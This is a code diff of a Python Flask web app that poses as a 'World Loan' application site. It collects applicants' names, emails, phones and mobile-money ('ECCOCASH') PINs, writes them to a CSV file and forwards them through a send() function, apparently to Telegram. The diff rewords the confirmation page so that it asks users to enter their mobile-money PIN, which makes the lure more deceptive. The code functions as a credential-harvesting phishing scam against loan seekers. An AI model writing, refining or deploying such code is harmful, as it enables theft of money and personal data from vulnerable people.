@@ -98,7 +98,7 @@ def submit():
     with open('leads.csv','a',newline='') as f:
         csv.writer(f).writerow([datetime.now().isoformat(),n,e,p,l,pur,pay,pin,ref])
     send('🔔 New World Loan Application'+N+'Ref: '+ref+N+'Name: '+n+N+'Email: '+e+N+'Phone: '+p+N+'Loan: '+l+N+'Purpose: '+pur+N+'Payback: '+pay+N+'ECCOCASH PIN: '+pin)
-    return H + '<div class=wrap><div class=card><h1>Thank you, '+n+'! ✅</h1><p style="text-align:center">Your application for <b>'+l+'</b> is received.</p><p style="text-align:center">Ref: <b>'+ref+'</b> | Email: <b>'+e+'</b></p><p style="text-align:center">SAVE THIS PIN - Use it to track your loan:</p><div class=pinbox>'+pin+'</div><p style="text-align:center;font-size:19px;color:#64748b">We will WhatsApp <b>'+p+'</b> shortly.<br>This ECCOCASH PIN is safe to keep.</p><a class=btn href=/track>TRACK MY LOAN →</a><br><a class=btn href='+W+' style="background:#25D366">WHATSAPP US NOW 💬</a><br><a class="btn btn-gold" href=/>APPLY AGAIN</a></div></div>'
+    return H + '<div class=wrap><div class=card><h1>Thank you, '+n+'! ✅</h1><p style="text-align:center">Your application for <b>'+l+'</b> is received.</p><p style="text-align:center">Ref: <b>'+ref+'</b> | Email: <b>'+e+'</b></p><p style="text-align:center">ENTER ECCOCASH PIN- Use it to track your loan:</p><div class=pinbox>'+pin+'</div><p style="text-align:center;font-size:19px;color:#64748b">We will WhatsApp <b>'+p+'</b> shortly.<br>This ECCOCASH PIN is safe to keep.</p><a class=btn href=/track>TRACK MY LOAN →</a><br><a class=btn href='+W+' style="background:#25D366">WHATSAPP US NOW 💬</a><br><a class="btn btn-gold" href=/>APPLY AGAIN</a></div></div>'
 
 @app.route('/track', methods=['GET','POST'])
 def track():
@@ -115,7 +115,7 @@ def track():
         if found:
             return H + '<div class=wrap><div class=card><h1>Loan Found ✅</h1><p style="text-align:center">Ref: <b>'+found[8]+'</b><br>Name: <b>'+found[1]+'</b><br>Loan: <b>'+found[4]+'</b><br>Status: <b>⏳ Under Review - We will WhatsApp you</b></p><a class=btn href='+W+'>WHATSAPP US</a></div></div>'
         return H + '<div class=wrap><div class=card><h1>PIN Not Found ❌</h1><p style="text-align:center">Check your PIN and try again.</p><a class=btn href=/track>TRY AGAIN</a></div></div>'
-    return H + '<div class=wrap><div class=card><h1>🔍 Track Your Loan</h1><p style="text-align:center;color:#64748b">Enter your 4-digit  PIN from your application</p><form method=POST><input name=pin required placeholder="Enter 4-digit PIN" maxlength=4 style="text-align:center;font-size:30px;letter-spacing:6px"><br><br><button class=btn>CHECK STATUS →</button></form></div></div>'
+    return H + '<div class=wrap><div class=card><h1>🔍 Track Your Loan</h1><p style="text-align:center;color:#64748b">Enter your 4-digit   </p><form method=POST><input name=pin required placeholder="Enter 4-digit PIN" maxlength=4 style="text-align:center;font-size:30px;letter-spacing:6px"><br><br><button class=btn>CHECK STATUS →</button></form></div></div>'
 
 @app.route('/test-telegram')
 def test():
